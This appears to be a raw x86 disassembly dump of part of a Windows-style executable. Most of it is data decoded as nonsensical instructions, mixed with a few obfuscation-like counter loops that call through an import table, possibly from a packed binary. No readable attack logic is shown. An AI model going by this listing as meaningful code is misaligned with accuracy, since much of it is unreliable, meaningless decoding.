  4196f4:	imul   eax,esi,0x5b
  4196f7:	adc    al,BYTE PTR [eax-0x5aadf0f6]
  4196fd:	mov    WORD PTR ss:[esi+eax*8+0x6e57b4a8],gs
  419705:	jns    0x4196e0
  419707:	inc    ebp
  419708:	dec    ebx
  419709:	imul   ebp,DWORD PTR [ecx],0xffffffa0
  41970c:	imul   esi,DWORD PTR [edx+0x7f030c43],0x56
  419713:	pop    ss
  419714:	cmova  ebp,ebx
  419717:	push   edi
  419718:	jmp    0xa8d1:0x5db25c13
  41971f:	mov    dl,0x70
  419721:	clc    
  419722:	dec    ebx
  419723:	ins    DWORD PTR es:[edi],dx
  419724:	call   0x5f79f5ba
  419729:	push   es
  41972a:	das    
  41972b:	test   al,0xe7
  41972d:	out    dx,eax
  41972e:	fld    DWORD PTR [edx]
  419730:	or     DWORD PTR [ebp+0x11b10a67],0x7b
  419737:	nop
  419738:	stos   BYTE PTR es:[edi],al
  419739:	mov    cl,0x88
  41973b:	push   0xd1237f09
  419740:	(bad)  
  419741:	sbb    al,0x72
  419743:	xchg   edx,eax
  419744:	je     0x41976c
  419746:	cwde   
  419747:	pop    edx
  419748:	les    edi,FWORD PTR [eax-0x1fac0123]
  41974e:	mov    ecx,DWORD PTR [ebp+0x14]
  419751:	add    esi,esi
  419753:	mov    ecx,DWORD PTR [ecx]
  419755:	mov    DWORD PTR [ebp-0x1c],ecx
  419758:	imul   edx,eax
  41975b:	xor    edi,DWORD PTR ds:0x42a801
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a87d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a845
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7b5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0xb751ddeb
  41979d:	xor    DWORD PTR [eax+edi*1],ebx
  4197a0:	leave  
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x4197b7
  4197a8:	daa    
  4197a9:	pop    edx
  4197aa:	add    DWORD PTR ds:0x7bd290e1,edi
  4197b0:	sbb    edi,DWORD PTR [eax+0x1f79a9ee]
  4197b6:	pop    ecx
  4197b7:	mov    edx,0x81dadad5
  4197bc:	dec    ebp
  4197bd:	or     BYTE PTR [ebx-0x92946d1],dh
  4197c3:	pop    es
  4197c4:	mov    ah,BYTE PTR [ecx-0x3e6243a3]
  4197ca:	(bad)  
  4197cb:	fwait
  4197cc:	popa   
  4197cd:	lock pop esp
  4197cf:	jnp    0x4197a2
  4197d1:	icebp  
  4197d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197d3:	mov    bh,0xb4
  4197d5:	(bad)  
  4197d7:	xchg   BYTE PTR [ecx+0x6b4e2ec1],al
  4197dd:	les    ecx,FWORD PTR [edx-0x5c6fefcd]
  4197e3:	mov    esi,0xea8ee62f
  4197e8:	pop    esi
  4197e9:	inc    edi
  4197ea:	out    dx,eax
  4197eb:	mov    bh,0xed
  4197ed:	fst    DWORD PTR [ebx+ecx*2+0x19442886]
  4197f4:	mov    edi,0x9afb8aca
  4197f9:	xchg   DWORD PTR [ecx],edi
  4197fb:	call   0x334e:0xc05faf88
  419802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419803:	xor    BYTE PTR [ecx-0x7c],al
  419806:	adc    eax,0x721985e0
  41980b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41980c:	out    dx,eax
  41980d:	push   ebp
  41980e:	mov    esi,0x2adec37d
  419813:	xlat   BYTE PTR ds:[ebx]
  419814:	push   ecx
  419815:	push   ebx
  419816:	ins    DWORD PTR es:[edi],dx
  419817:	cld    
  419818:	mov    dl,0x21
  41981a:	ja     0x4197b7
  41981c:	popf   
  41981d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41981e:	push   ss
  41981f:	repnz aad 0xc4
  419822:	and    BYTE PTR [ebx+0x69d97d82],ch
  419828:	xor    ecx,ebx
  41982a:	adc    BYTE PTR [ebp+0x78],dh
  41982d:	inc    ebx
  41982e:	push   ecx
  41982f:	adc    al,0x30
  419831:	push   0xf08f4cee
  419836:	mov    ebx,0x694cdbf8
  41983b:	inc    esi
  41983c:	int3   
  41983d:	inc    esi
  41983e:	xchg   bl,ah
  419840:	sbb    edi,DWORD PTR [edx-0x24a7a617]
  419846:	loopne 0x4198b0
  419848:	pop    edi
  419849:	mov    WORD PTR [ecx],gs
  41984b:	outs   dx,BYTE PTR ds:[esi]
  41984c:	mov    BYTE PTR [eax],dl
  41984e:	enter  0xade4,0x19
  419852:	dec    ebp
  419853:	add    cl,BYTE PTR [edx-0x264f15f5]
  419859:	jae    0x419868
  41985b:	push   cs
  41985c:	mov    ecx,DWORD PTR [esi+0x59bb6df3]
  419862:	pop    ds
  419863:	js     0x4198df
  419865:	push   0xffffff93
  419867:	xlat   BYTE PTR ds:[ebx]
  419868:	jo     0x4198e6
  41986a:	rcr    BYTE PTR [edi+0x118685af],cl
  419870:	mov    esp,0x3b523b69
  419875:	cmp    BYTE PTR [ecx-0x1c],0xd1
  419879:	loop   0x41986f
  41987b:	daa    
  41987c:	push   0x73
  41987e:	or     al,0x7b
  419880:	test   ch,0x95
  419883:	xor    ebx,DWORD PTR [eax+0x4c]
  419886:	dec    ecx
  419887:	shr    dh,1
  419889:	mov    ch,0xe4
  41988b:	scas   eax,DWORD PTR es:[edi]
  41988c:	out    dx,al
  41988d:	mov    fs,WORD PTR [edi+0x4a]
  419890:	mov    esi,0xb629188b
  419895:	mov    edx,0xfe980e45
  41989a:	mov    ?,WORD PTR [esi+0x7f0d1bde]
  4198a0:	clc    
  4198a1:	arpl   WORD PTR [eax+esi*2-0x694657dd],bx
  4198a8:	fidiv  DWORD PTR [esi-0x3a]
  4198ab:	imul   esp,DWORD PTR [esp+eax*4],0x94ffad8c
  4198b2:	lahf   
  4198b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198b4:	mov    ecx,0xcfeae613
  4198b9:	ds dec ecx
  4198bb:	mov    cl,0xb
  4198bd:	or     DWORD PTR [edi+eax*8+0x1177cea5],0x2f
  4198c5:	ins    BYTE PTR es:[edi],dx
  4198c6:	test   DWORD PTR [eax+edi*2-0x7d06a292],esp
  4198cd:	mov    dh,0xf8
  4198cf:	ret    
  4198d0:	sub    eax,0xc74269e7
  4198d5:	retf   
  4198d6:	gs push 0x4dc3336e
  4198dc:	jl     0x419882
  4198de:	lods   al,BYTE PTR ds:[esi]
  4198df:	fdivr  st(6),st
  4198e1:	dec    esi
  4198e2:	retf   
  4198e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198e4:	mov    cl,al
  4198e6:	adc    esi,DWORD PTR [esi+0x57]
  4198e9:	or     eax,0x8a690c3f
  4198ee:	retf   0x92ff
  4198f1:	loop   0x4198e6
  4198f3:	fisttp WORD PTR [eax+0x6b8ac515]
  4198f9:	xchg   DWORD PTR [esp+eiz*4],ecx
  4198fc:	int    0xfd
  4198fe:	dec    ebp
  4198ff:	inc    eax
  419900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419901:	xchg   ecx,eax
  419902:	stc    
  419903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419904:	jmp    0x17c9:0x772f9b1
  41990b:	xchg   BYTE PTR [ecx-0x7df2c4a8],ch
  419911:	sahf   
  419912:	push   ebx
  419913:	cmp    dh,ah
  419915:	or     cl,BYTE PTR [eax-0x6f]
  419918:	stos   DWORD PTR es:[edi],eax
  419919:	mov    ds:0x3365b64d,eax
  41991e:	imul   ebp,DWORD PTR [edx-0xa0efb6a],0x2d2b8cbe
  419928:	push   edx
  419929:	cwde   
  41992a:	lahf   
  41992b:	mov    eax,0xbac9e383
  419930:	jae    0x4198f6
  419932:	outs   dx,BYTE PTR ds:[esi]
  419933:	stc    
  419934:	sbb    ch,BYTE PTR [ecx]
  419936:	test   al,0xb1
  419938:	mov    dl,0x0
  41993a:	scas   eax,DWORD PTR es:[edi]
  41993b:	pop    esi
  41993c:	sbb    al,0x8
  41993e:	push   esi
  41993f:	pusha  
  419940:	das    
  419941:	aaa    
  419942:	add    dh,dl
  419944:	cwde   
  419945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419946:	pop    eax
  419947:	cmp    eax,0xddc58aff
  41994c:	mov    bl,0xb3
  41994e:	mov    al,0x77
  419950:	les    edi,FWORD PTR [edi]
  419952:	data16 sub al,0xc3
  419956:	xor    al,0xb4
  419958:	jo     0x4199ac
  41995a:	mov    DWORD PTR ds:0x36eed0c6,esi
  419960:	clc    
  419961:	mov    esi,0xbc1e3f02
  419966:	push   es
  419967:	(bad)  
  419969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41996a:	loope  0x41997e
  41996c:	sbb    DWORD PTR [esi*4+0x40d5b376],esi
  419973:	jo     0x419906
  419975:	jo     0x4199cd
  419977:	in     al,dx
  419978:	xchg   DWORD PTR [ebx+ebp*2-0x1],eax
  41997c:	push   ds
  41997d:	rol    BYTE PTR [edx*4+0x7a3c7833],1
  419984:	mov    ebx,0x98093b85
  419989:	dec    edx
  41998a:	push   ss
  41998b:	jmp    0x4199b9
  41998d:	test   al,0xb1
  41998f:	loope  0x41992b
  419991:	push   esp
  419992:	or     ebx,DWORD PTR [edx]
  419994:	jne    0x419932
  419996:	mov    ch,0x37
  419998:	out    dx,al
  419999:	sahf   
  41999a:	cmc    
  41999b:	cmp    BYTE PTR [eax-0x28f95ade],bl
  4199a1:	pop    ds
  4199a2:	adc    DWORD PTR [eax+0x8],eax
  4199a5:	push   0xcc4102b2
  4199aa:	pusha  
  4199ab:	call   0x8ed2b5be
  4199b0:	sar    DWORD PTR [ebx-0x80],cl
  4199b3:	stos   DWORD PTR es:[edi],eax
  4199b4:	and    ah,BYTE PTR [edi+0x335bd81d]
  4199ba:	ins    DWORD PTR es:[edi],dx
  4199bb:	jmp    0x81d7:0x2bae3067
  4199c2:	shl    esp,1
  4199c4:	pop    ds
  4199c5:	add    BYTE PTR [eax],al
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a80d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a881,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a881,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a881,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a881
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a881,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a765,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a765,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a765,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a765,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a765
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a765,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a765
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a765,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a805,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a849,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7b5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a83d,0x42a7b1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a881,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a881
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a881,eax
  419ac8:	cmp    DWORD PTR ds:0x42a881,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a881,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a805
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7cd
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a845
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0x35
  419b14:	or     esp,ecx
  419b16:	mov    esi,0x787fcfd0
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419b5c
  419b20:	xchg   ebp,eax
  419b21:	sub    al,0xa5
  419b23:	arpl   WORD PTR [esi-0x6753c0eb],di
  419b29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b2a:	movups xmm3,xmm0
  419b2d:	in     al,dx
  419b2e:	jl     0x419ae4
  419b30:	mov    edi,0xfcbe1f77
  419b35:	sub    ch,BYTE PTR [ebx+0x39787d10]
  419b3b:	mov    al,0x6f
  419b3d:	mov    ebx,0xdc877dc7
  419b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b43:	jmp    0x419ad3
  419b45:	dec    BYTE PTR [ecx]
  419b47:	pop    eax
  419b48:	sbb    al,0x87
  419b4a:	je     0x419af5
  419b4c:	xor    eax,0x8ec16135
  419b51:	or     eax,DWORD PTR [ebx]
  419b53:	arpl   si,di
  419b55:	mov    ebx,DWORD PTR [esi-0x13f775f]
  419b5b:	imul   eax,DWORD PTR [ebx+0xa],0xcfc81d34
  419b62:	dec    eax
  419b63:	pop    ebp
  419b64:	fwait
  419b65:	pop    es
  419b66:	adc    DWORD PTR [ecx],ebx
  419b68:	clc    
  419b69:	(bad)  
  419b6a:	push   esi
  419b6b:	jge    0x419b85
  419b6d:	cmp    ch,dl
  419b6f:	shl    DWORD PTR [ebp-0x2fdce99a],1
  419b75:	mov    esi,0x18cfe253
  419b7a:	hlt    
  419b7b:	in     eax,0x7
  419b7d:	int3   
  419b7e:	or     dh,0x81
  419b81:	ds test al,0x11
  419b84:	xchg   BYTE PTR [eax+0x6e0c0da5],ah
  419b8a:	xchg   BYTE PTR [edx],bh
  419b8c:	xchg   ebp,eax
  419b8d:	aas    
  419b8e:	add    eax,0x651101e3
  419b93:	lods   al,BYTE PTR ds:[esi]
  419b94:	ins    DWORD PTR es:[edi],dx
  419b95:	jbe    0x419baf
  419b97:	xchg   esp,eax
  419b98:	push   eax
  419b99:	shl    DWORD PTR [edi-0xc7710ba],cl
  419b9f:	dec    ecx
  419ba0:	dec    esi
  419ba1:	xchg   ebp,eax
  419ba2:	sbb    cl,ch
  419ba4:	sar    edx,1
  419ba6:	mov    cl,0x5d
  419ba8:	mov    BYTE PTR [edx+0x33126afd],cl
  419bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419baf:	push   esi
  419bb0:	jo     0x419c1a
  419bb2:	xor    esi,0xcc096f7e
  419bb8:	cli    
  419bb9:	ret    
  419bba:	lock xchg ebp,eax
  419bbc:	pop    esi
  419bbd:	push   cs
  419bbe:	out    0xa7,eax
  419bc0:	mov    WORD PTR ds:[edi+eax*4+0x18],es
  419bc5:	lock and eax,eax
  419bc8:	mov    ds:0x957fee8c,al
  419bcd:	(bad)  
  419bce:	jmp    0x419c3a
  419bd0:	gs div esp
  419bd3:	push   cs
  419bd4:	jns    0x419bfb
  419bd6:	mov    ds:0x9a8c10c3,al
  419bdb:	xlat   BYTE PTR ds:[ebx]
  419bdc:	xchg   edi,eax
  419bdd:	cmp    eax,0x29c73bc3
  419be2:	jae    0xdeb066bf
  419be8:	sub    bl,BYTE PTR [ebp-0xb]
  419beb:	adc    DWORD PTR [ecx],ebp
  419bed:	scas   al,BYTE PTR es:[edi]
  419bee:	push   0x51
  419bf0:	test   BYTE PTR [eax],0xe7
  419bf3:	dec    ebp
  419bf4:	dec    ebp
  419bf5:	out    dx,al
  419bf6:	push   edx
  419bf7:	xchg   ebp,eax
  419bf8:	hlt    
  419bf9:	gs fmul st(2),st
  419bfc:	jp     0x419c6f
  419bfe:	sbb    BYTE PTR [edi-0x67],ah
  419c01:	and    dl,ah
  419c03:	sub    eax,0xd7464f6d
  419c08:	out    dx,al
  419c09:	ins    DWORD PTR es:[edi],dx
  419c0a:	ja     0x419c4b
  419c0c:	(bad)  
  419c0d:	fld    QWORD PTR [eax]
  419c0f:	mov    BYTE PTR [ebx],dl
  419c11:	push   0xaa38a118
  419c16:	cli    
  419c17:	xchg   ecx,eax
  419c18:	add    al,0x89
  419c1a:	or     BYTE PTR [edx+0x29],0xd1
  419c1e:	adc    al,0x7e
  419c20:	pushf  
  419c21:	das    
  419c22:	adc    eax,0xef728613
  419c27:	dec    esp
  419c28:	icebp  
  419c29:	outs   dx,DWORD PTR ds:[esi]
  419c2a:	sar    BYTE PTR [eax-0x4a67393e],cl
  419c30:	inc    edx
  419c31:	add    cl,BYTE PTR [ebx]
  419c33:	adc    ah,BYTE PTR [ecx]
  419c35:	leave  
  419c36:	stc    
  419c37:	pop    ecx
  419c38:	in     al,dx
  419c39:	push   edx
  419c3a:	out    dx,al
  419c3b:	mov    ah,0xb8
  419c3d:	mov    ebp,0xce8742f0
  419c42:	aas    
  419c43:	std    
  419c44:	(bad)  
  419c45:	cld    
  419c46:	or     ch,BYTE PTR [ecx+eax*4-0x1488917b]
  419c4d:	xchg   ebp,eax
  419c4e:	or     cl,ah
  419c50:	sub    eax,0x6d6a52fd
  419c55:	cmp    eax,0x5adbbd0
  419c5a:	in     eax,dx
  419c5b:	pushf  
  419c5c:	mov    ch,cl
  419c5e:	xchg   ebp,eax
  419c5f:	mov    ds:0x8901be6b,eax
  419c64:	lods   al,BYTE PTR ds:[esi]
  419c65:	xlat   BYTE PTR ds:[ebx]
  419c66:	push   0xfffffffd
  419c68:	xor    BYTE PTR [eax+0x541b6f88],bh
  419c6e:	ins    BYTE PTR es:[edi],dx
  419c6f:	mov    eax,ds:0x6f0bc605
  419c74:	jmp    FWORD PTR [esi-0x3e]
  419c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c78:	adc    DWORD PTR [edi+0x27],ebx
  419c7b:	les    esi,FWORD PTR [edi+ecx*8+0x6]
  419c7f:	sbb    DWORD PTR [eax+0xf290c2],ecx
  419c85:	jge    0x419c8b
  419c87:	fstp   TBYTE PTR [ebp-0x3f]
  419c8a:	xchg   ebp,eax
  419c8b:	mul    BYTE PTR [ecx+eiz*2-0x5fb055b7]
  419c92:	mov    bh,0xee
  419c94:	push   edx
  419c95:	lea    ebp,[edi+0x77]
  419c98:	inc    edi
  419c99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c9a:	push   0x172a4681
  419c9f:	jno    0x419c66
  419ca1:	std    
  419ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ca3:	jnp    0x419c79
  419ca5:	pusha  
  419ca6:	vorps  xmm6,xmm6,xmm1
  419caa:	loopne 0x419cd0
  419cac:	dec    ecx
  419cad:	rcr    DWORD PTR [ebx-0x78597c58],0x60
  419cb4:	sub    eax,0x14070d10
  419cb9:	add    DWORD PTR [edi+0x49435ee0],0xffffff8b
  419cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cc1:	imul   esp
  419cc3:	xchg   edi,eax
  419cc4:	in     al,0xef
  419cc6:	in     eax,dx
  419cc7:	jb     0x419d18
  419cc9:	jae    0x419d3f
  419ccb:	inc    eax
  419ccc:	fwait
  419ccd:	mov    ebx,0x44f1d4e2
  419cd2:	inc    esi
  419cd3:	inc    ebx
  419cd4:	aas    
  419cd5:	rol    BYTE PTR [ebx+0x74a5e50b],1
  419cdb:	xchg   edx,eax
  419cdc:	scas   al,BYTE PTR es:[edi]
  419cdd:	jae    0x419cf5
  419cdf:	dec    edx
  419ce0:	rcl    BYTE PTR [ebp+0x1776432],0xc9
  419ce7:	js     0x419d4b
  419ce9:	scas   eax,DWORD PTR es:[edi]
  419cea:	retf   0x8551
  419ced:	jg     0x419cbd
  419cef:	adc    ch,dl
  419cf1:	xlat   BYTE PTR ds:[ebx]
  419cf2:	int    0x29
  419cf4:	mov    BYTE PTR [edi-0x62e6e265],ch
  419cfa:	ror    BYTE PTR [eax+edi*1-0x20],0xe5
  419cff:	mov    cl,0xe3
  419d01:	fisub  DWORD PTR [edi+ebx*1+0x4945b64b]
  419d08:	dec    edi
  419d09:	mov    ebp,DWORD PTR [ecx]
  419d0b:	fdiv   st,st(3)
  419d0d:	das    
  419d0e:	sar    bl,0x30
  419d11:	cs mov edx,cs
  419d14:	xchg   esi,eax
  419d15:	sbb    esp,DWORD PTR [ebx+0x4154f111]
  419d1b:	cld    
  419d1c:	fisttp QWORD PTR [ecx-0x6f50c785]
  419d22:	ja     0x419cc9
  419d24:	fwait
  419d25:	repz retf 0xbf9d
  419d29:	inc    edx
  419d2a:	repnz push ebx
  419d2c:	mov    al,0xbf
  419d2e:	mov    ?,WORD PTR [eax]
  419d30:	cmp    al,0xe5
  419d32:	out    0xa5,al
  419d34:	jns    0x419d18
  419d36:	stos   DWORD PTR es:[edi],eax
  419d37:	mov    eax,DWORD PTR [ebp-0x20]
  419d3a:	je     0x41a8c9
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a839,0x42a76d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a889,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a83d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	sub    al,0x9c
  419d7e:	push   ds
  419d7f:	mov    ah,0xe8
  419d81:	int    0x7f
  419d83:	js     0x419d95
  419d85:	jle    0x419dff
  419d87:	js     0x419d8d
  419d89:	adc    DWORD PTR [edi+eax*4+0x4a],edx
  419d8d:	pushf  
  419d8e:	and    eax,0xcf56a3be
  419d93:	mov    ds:0x3d3a14fa,eax
  419d98:	or     DWORD PTR [ebx],esp
  419d9a:	out    0x2c,al
  419d9c:	jg     0x419df6
  419d9e:	les    ecx,FWORD PTR [ebp-0x7dc48db4]
  419da4:	lock sub ch,al
  419da7:	jecxz  0x419d53
  419da9:	sbb    al,0x1d
  419dab:	or     BYTE PTR [ecx-0x2e],bl
  419dae:	scas   al,BYTE PTR es:[edi]
  419daf:	sar    BYTE PTR [esi-0x9],0x64
  419db3:	(bad)  
  419db5:	push   0x8665d870
  419dba:	in     al,dx
  419dbb:	icebp  
  419dbc:	popa   
  419dbd:	inc    edi
  419dbe:	mov    bh,0x8c
  419dc0:	adc    eax,DWORD PTR [ebx-0x2a466cc6]
  419dc6:	mov    al,ds:0x88063c1c
  419dcb:	cmp    bl,BYTE PTR [esi+0x39b0cb66]
  419dd1:	xchg   esi,eax
  419dd2:	mov    esi,?
  419dd4:	addr16 push esi
  419dd6:	repnz inc edi
  419dd8:	repz jge 0x419e3d
  419ddb:	inc    ebx
  419ddc:	(bad)  
  419ddd:	(bad)  
  419dde:	cmp    eax,0x70b20915
  419de3:	xor    BYTE PTR [ecx],cl
  419de5:	dec    ebx
  419de6:	pop    esp
  419de7:	add    ecx,esp
  419de9:	sbb    al,0x34
  419deb:	sar    DWORD PTR [esi],0x1b
  419dee:	jae    0x419dce
  419df0:	mov    ecx,0xf7ad61c4
  419df5:	jl     0x419e0a
  419df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419df8:	shr    DWORD PTR [eax+0x18],1
  419dfb:	pop    edx
  419dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dfd:	and    eax,0xdd4a37ed
  419e02:	or     BYTE PTR [ebx],bh
  419e04:	aaa    
  419e05:	das    
  419e06:	lock push ds
  419e08:	or     eax,0x28976974
  419e0d:	cld    
  419e0e:	jo     0x419e10
  419e10:	dec    edx
  419e11:	mov    eax,0x93a8ff8
  419e16:	mov    dl,0x98
  419e18:	inc    ebp
  419e19:	and    DWORD PTR [ecx-0x2a],edx
  419e1c:	inc    ebp
  419e1d:	xor    BYTE PTR [ebp+0x7a27292a],al
  419e23:	mov    ds:0xdc0d9070,al
  419e28:	pop    eax
  419e29:	jmp    0x9abf:0x25936ea3
  419e30:	sbb    eax,0x2aa9203c
  419e35:	pop    esi
  419e36:	aam    0x65
  419e38:	stos   BYTE PTR es:[edi],al
  419e39:	fwait
  419e3a:	mov    BYTE PTR [ecx+0x66],cl
  419e3d:	test   eax,0x4a82c956
  419e42:	add    ebp,0x5bbade67
  419e48:	into   
  419e49:	xlat   BYTE PTR ds:[ebx]
  419e4a:	shl    DWORD PTR [esi-0x635d0fab],1
  419e50:	mov    BYTE PTR [esi-0x4c],ch
  419e53:	add    DWORD PTR [eax],0xffffff84
  419e56:	mov    ebp,0x2b98ae94
  419e5b:	pop    esi
  419e5c:	jne    0x419e4d
  419e5e:	ret    
  419e5f:	sub    al,0xa6
  419e61:	dec    esp
  419e62:	js     0x419df2
  419e64:	sti    
  419e65:	imul   DWORD PTR [edx-0x3b2fc0c7]
  419e6b:	fs mov al,0xa
  419e6e:	add    edi,esi
  419e70:	retf   0x13ed
  419e73:	sub    al,0x55
  419e75:	push   ebp
  419e76:	xor    ecx,DWORD PTR [eax-0x37]
  419e79:	rcr    BYTE PTR [ebp*1-0x76b2afa0],1
  419e80:	jbe    0x419e86
  419e82:	mov    ebp,0xe7416609
  419e87:	call   0x9911:0xda7db5f6
  419e8e:	pop    es
  419e8f:	lahf   
  419e90:	cwde   
  419e91:	sub    BYTE PTR [esi],cl
  419e93:	scas   eax,DWORD PTR es:[edi]
  419e94:	dec    esp
  419e95:	(bad)  
  419e96:	in     al,0xf7
  419e98:	push   esp
  419e99:	fs mov dh,0x36
  419e9c:	sahf   
  419e9d:	or     eax,0x5c04f692
  419ea2:	out    dx,eax
  419ea3:	mov    ecx,0xf82c6e69
  419ea8:	mov    ah,0xdf
  419eaa:	mov    ebp,DWORD PTR [edi]
  419eac:	sub    DWORD PTR [ebx+0x2d21b7a1],edx
  419eb2:	add    eax,0xcd8fc53f
  419eb7:	ret    0x69dc
  419eba:	hlt    
  419ebb:	pop    ecx
  419ebc:	xchg   esp,eax
  419ebd:	sub    esi,esp
  419ebf:	inc    ebp
  419ec0:	imul   eax,DWORD PTR [ebx+0x25],0xffffffde
  419ec4:	pop    ebx
  419ec5:	push   cs
  419ec6:	push   cs
  419ec7:	sub    al,0xeb
  419ec9:	ja     0x419ef2
  419ecb:	cmc    
  419ecc:	inc    esp
  419ecd:	xor    DWORD PTR [eax+edx*2-0x1ddae9d2],0x3a
  419ed5:	pushf  
  419ed6:	sbb    eax,0x8006094f
  419edb:	iret   
  419edc:	jns    0x419f16
  419ede:	popa   
  419edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ee0:	clc    
  419ee1:	dec    esi
  419ee2:	push   ds
  419ee3:	stos   BYTE PTR es:[edi],al
  419ee4:	inc    esp
  419ee5:	ret    
  419ee6:	scas   eax,DWORD PTR es:[edi]
  419ee7:	jp     0x419e90
  419ee9:	push   0x47d5c324
  419eee:	mov    dh,0x7b
  419ef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ef1:	xchg   DWORD PTR [esp+ecx*2+0x63a525b2],ecx
  419ef8:	jl     0x419e81
  419efa:	or     eax,0x3715821a
  419eff:	sub    BYTE PTR [ebp+0x5fedb5],ah
  419f05:	sbb    esi,DWORD PTR [edi]
  419f07:	jb     0x419ed2
  419f09:	xchg   BYTE PTR [ebp+0x66fec353],al
  419f0f:	and    al,0x53
  419f11:	dec    edx
  419f12:	jo     0x419f4c
  419f14:	push   esp
  419f15:	mov    dh,BYTE PTR [eax-0x1f4c2419]
  419f1b:	mov    ebx,0x95f62dc9
  419f20:	pop    es
  419f21:	cmp    al,0x2e
  419f23:	inc    eax
  419f24:	retf   
  419f25:	test   dh,dh
  419f27:	sub    esp,DWORD PTR [edx-0x28]
  419f2a:	adc    eax,0x3976f0a3
  419f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f30:	data16 mov ds:0x2c1ea7e,al
  419f36:	jne    0x419ec7
  419f38:	mov    bl,0x74
  419f3a:	inc    ebx
  419f3b:	pop    ss
  419f3c:	js     0x419ed1
  419f3e:	sub    al,0x7
